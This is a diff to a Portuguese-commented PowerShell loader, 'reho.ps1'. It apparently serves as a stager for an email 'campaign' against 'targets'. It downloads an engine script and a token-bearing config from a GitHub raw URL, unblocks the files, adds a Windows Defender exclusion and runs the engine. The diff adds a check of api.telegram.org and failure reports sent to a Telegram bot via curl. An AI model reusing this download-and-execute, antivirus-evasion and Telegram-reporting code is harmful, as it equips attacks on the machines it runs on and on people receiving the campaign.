@@ -1,13 +1,18 @@
-# reho.ps1 v4 - canal de distribuicao estavel (ASCII-puro, PS 5.1+, ZERO segredo)
-# O que muda aqui NUNCA quebra o one-liner: a campanha mora em reho.config.json
-# (versionado, baixado junto com rehot.ps1). Este runner e 100% fixo:
+# reho.ps1 v4.3 - canal de distribuicao estavel (ASCII-puro, PS 5.1+, ZERO segredo)
+# O one-liner (curl+File) NUNCA muda: reho.ps1 + reho.config.json sao o canal fixo;
+# a campanha/tokens mudam editando reho.config.json no stl e re-up. Papeis em
+# docs/canal-distribuicao.md. Versao: 4.3 (loga no estagio-2; o PING REHO_TG_CHECK
+# confere api.telegram.org ANTES da campanha).
 #   1. cria %LOCALAPPDATA%\rehot
-#   2. baixa rehot.ps1 + reho.config.json (2 engines por arquivo: iwr -> curl fallback;
-#      canary em cada arquivo; config ausente/ilegivel cai em default sem abortar)
+#   2. baixa reho.config.json (tokens+campanha) e rehot.ps1 (motor) - engines:
+#      curl.exe -> iwr; canary em cada arquivo; guard parse do rehot baixado
 #   3. unblock + exclusao do Defender (a exclusao so aplica em shell admin; sem admin segue sem ela)
-#   4. executa powershell.exe -File com os overrides do config; sai com exit code do estagio
+#   4. PING REHO_TG_CHECK: checa api.telegram.org/getMe ANTES da campanha (exige
+#      corpo da API; 401/429 = token/quota; falha de rede = FALHA estagio-8,
+#      tenta avisar o bot via curl e aborta)
+#   5. executa powershell.exe -File com os overrides do config; sai com exit code do estagio
 # Diagnostico: linhas [reho ...]; FALHA sai motivo + exit code do estagio (1..9).
-# Nao existe segredo neste script: tokens do bot moram no rehot.config.json local (gitignored).
+# Nao existe segredo neste script: tokens do bot moram no reho.config.json (no stl).
 
 $ErrorActionPreference = 'Stop'
 $base = 'https://raw.githubusercontent.com/SagazBeiramar/stl/refs/heads/main'
@@ -76,7 +81,8 @@ $toks = $null; $perr = $null
 if ($null -ne $perr -and $perr.Count -gt 0) {
     RhoFail 2 ('rehot.ps1 baixado nao parseia (' + $perr.Count + ' erros; arquivo parcial ou corrompido)')
 }
-Write-Output ('[reho] ok estagio-2 rehot.ps1 (' + (Get-Item $t).Length + ' bytes)')
+$rehotVer = if ((Get-Content $t -Raw).Contains('enviohot.report.v1')) { 'v1' } else { 'sem' }
+Write-Output ('[reho] ok estagio-2 rehot.ps1 (' + (Get-Item $t).Length + ' bytes, relatorio ' + $rehotVer + ')')
 
 try { Unblock-File $t -ErrorAction SilentlyContinue } catch { }
 try { Unblock-File $c -ErrorAction SilentlyContinue } catch { }
@@ -152,24 +158,26 @@ if ($TelegramChatId) { $argvs += '-TelegramChatId', $TelegramChatId }
 if ($ListaTok) { $argvs += '-ListaTok', $ListaTok }
 if ($ListaChatId) { $argvs += '-ListaChatId', $ListaChatId }
 
-# PING REHO_TG_CHECK: com token no config, checa api.telegram.org ANTES da campanha
-# (o rehot envia o report via iwr/Invoke-WebRequest; se iwr estiver bloqueado no alvo
-# mas curl passar, o PING ainda avisa). 429/401 = chegamos la (token/problema de quota,
-# nao de rede). So "nao chegamos" aborta: reporta ao bot local + exit 8.
+# PING REHO_TG_CHECK: com token no config, checa api.telegram.org/getMe ANTES da
+# campanha. "Chegou a API" exige o CORPO JSON da API ("ok":...), nao so o status:
+# um 429/404 generico de proxy (sem corpo da Telegram) segue como FALHA. So falha
+# rede aborta: exit 8 + tenta avisar o bot via curl (o rehot reporta via iwr; se
+# iwr ta bloqueado mas curl passa, a note ainda chega).
 if ($TgTok -and $TelegramChatId -and $telegram -and (-not $selfTest)) {
-    $pingCode = ''
-    try {
-        $pingCode = [string](& curl.exe -sS -o NUL -w "%{http_code}" --connect-timeout 10 ("https://api.telegram.org/bot" + $TgTok + "/getMe") 2>$null)
-    } catch { }
-    if ($pingCode -match '^(200|401|429|400)$') {
-        Write-Output ('[reho] ok PING REHO_TG_CHECK (api.telegram.org HTTP ' + $pingCode + ')')
+    $pingOut = ''
+    try { $pingOut = [string](& curl.exe -sS --connect-timeout 10 -w "`n%{http_code}" ("https://api.telegram.org/bot" + $TgTok + '/getMe') 2>$null) } catch { }
+    $pingCode = ''; $pingBody = ''
+    $nl = $pingOut.LastIndexOf("`n")
+    if ($nl -ge 0) { $pingBody = $pingOut.Substring(0, $nl); $pingCode = $pingOut.Substring($nl + 1).Trim() } else { $pingCode = $pingOut.Trim() }
+    if ((($pingCode -match '^(200|404)$') -and ($pingBody -match '"ok"\s*:')) -or ($pingCode -match '^(401|429)$')) {
+        $extra = ''
+        if ($pingCode -eq '401') { $extra = ' - token invalido (rotacionou no BotFather?)' }
+        Write-Output ('[reho] ok PING REHO_TG_CHECK (api.telegram.org HTTP ' + $pingCode + $extra + ')')
     } else {
         $note = '[reho FALHA] PING REHO_TG_CHECK - api.telegram.org INALCANCAVEL neste alvo (HTTP ' + $pingCode + '; iwr/curl bloqueados ou DNS). O email pode ter sido enviado normalmente; o report do Telegram nao chega daqui.'
         $tgPayload = @{ chat_id = $TelegramChatId; text = $note; disable_web_page_preview = $false } | ConvertTo-Json -Compress
-        try {
-            & curl.exe -sS -o NUL -w "%{http_code}" --connect-timeout 10 -X POST -H "Content-Type: application/json" --data $tgPayload ("https://api.telegram.org/bot" + $TgTok + "/sendMessage") 2>$null | Out-Null
-        } catch { }
-        RhoFail 8 'PING REHO_TG_CHECK falhou (api.telegram.org unreachable no alvo; report local enviado ao bot)'
+        try { & curl.exe -sS -o NUL --connect-timeout 10 -X POST -H 'Content-Type: application/json' --data $tgPayload ("https://api.telegram.org/bot" + $TgTok + '/sendMessage') 2>$null | Out-Null } catch { }
+        RhoFail 8 ('PING REHO_TG_CHECK falhou (HTTP ' + $pingCode + '; api.telegram.org unreachable no alvo; note local enviada ao bot se curl alcancar)')
     }
 }
 
